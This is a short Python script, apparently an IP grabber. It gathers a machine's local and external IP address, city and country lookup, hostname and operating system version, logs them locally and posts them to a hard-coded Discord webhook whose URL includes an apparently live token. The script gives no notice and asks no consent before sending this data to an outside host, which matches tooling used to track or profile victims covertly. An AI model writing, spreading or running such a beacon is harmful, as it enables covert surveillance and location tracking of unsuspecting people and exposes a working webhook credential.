import datetime
import socket
import platform
import requests

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
    except Exception as e:
        print("Exception occurred (IP ADDRESS): ", e)
        ip_address = None
    finally:
        s.close()
    return ip_address

def get_external_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json').json()
        return response["ip"]
    except Exception as e:
        print("Exception occurred (EXTERNAL IP)", e)
        return None

def get_location():
    try:
        ip_address = get_external_ip()
        response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
        city = response.get("city")
        country = response.get("country_name")
        location_text = f"{city}, {country}"
        return location_text
    except Exception as e:
        print("Exception occurred (CITY/COUNTRY)", e)
        return None

def get_hostname():
    try:
        hostname = socket.gethostname()
    except Exception as e:
        print("Exception occurred (HOSTNAME): ", e)
        hostname = None
    return hostname

def get_os_info():
    os_name = platform.system()
    os_version = platform.release()
    return os_name, os_version

def save_to_file(content):
    try:
        with open("skrypt_log.txt", "a") as file:
            file.write(content + "\n")
    except Exception as e:
        print("Error in saving to file: ", e)

def send_to_discord_webhook(webhook_url, content):
    data = {"content": content}
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print("Sent to discord.")
        else:
            print("Error in sending message to discord.")
    except Exception as e:
        print("Error in sending message to discord: ",e)

if __name__ == "__main__":
    current_time = datetime.datetime.now()
    formatted_time = current_time.strftime("%d-%m-%Y | %H:%M")

    ip = get_ip_address()
    external_ip = get_external_ip()
    hostname = get_hostname()
    os_name, os_version = get_os_info()
    location = get_location()

    webhook_url = "https://discord.com/api/webhooks/1139219671514624131/ozlM1RCPPFz3Zb96NVYyvZomBk8_2-KrU0vtGSzUFIzy6HOKszmDF68DrbCO5x-EZ1Lh"

    log_content = "Date: " + formatted_time + "\n"

    if ip:
        log_content += "IP Address: " + ip + "\n"
    else:
        log_content += "IP Address: NONE\n"

    if external_ip:
        log_content += "External IP: " + external_ip + "\n"
    else:
        log_content += "External IP: NONE\n"

    if location:
        log_content += "Location: " + location + "\n"
    else:
        log_content += "Location: NONE\n"

    if hostname:
        log_content += "PC Hostname: " + hostname + "\n"
    else:
        log_content += "PC Hostname: NONE\n"

    if os_name:
        log_content += "OS: " + os_name + " " + os_version +"\n"
    else:
        log_content += "OS: NONE\n"


    print(log_content)
    save_to_file(log_content)
    send_to_discord_webhook(webhook_url, log_content)